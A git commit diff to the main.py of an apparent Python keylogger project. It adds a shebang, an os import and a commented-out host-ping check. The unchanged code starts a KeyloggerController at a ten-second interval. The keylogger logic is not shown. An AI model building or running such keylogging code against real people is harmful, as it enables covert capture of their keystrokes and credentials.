fb3f132f753000004a1ab4338ade017054ea8c89
Bayron Vazquez <bayron.vazquez@sandox.com.mx>
2024-01-21 11:57:40 -0600

    .

--- main.py
+++ main.py
@@ -1,5 +1,9 @@
+#!/usr/bin/env python3
+
 from controller.FileSystemController import FileSystemController
 from controller.KeyloggerController import KeyloggerController
+
+import os
 
 if __name__ == "__main__":
     fs_controller = FileSystemController()
@@ -8,3 +12,17 @@ if __name__ == "__main__":
     # Iniciamos el Keylogger [OK]
     keylogger = KeyloggerController(interval=10)
     keylogger.start()
+
+
+ 
+    # hostname = "192.168.1.220" #example
+    # comando_ping_para_windows = "ping -n 1 " + hostname
+    # comando_ping_para_linux   = "ping -c 1 " + hostname
+
+    # response = os.system(comando_ping_para_linux)
+
+    # #and then check the response...
+    # if response == 0:
+    #     print(hostname, 'is up!')
+    # else:
+    #     print(hostname, 'is down!')
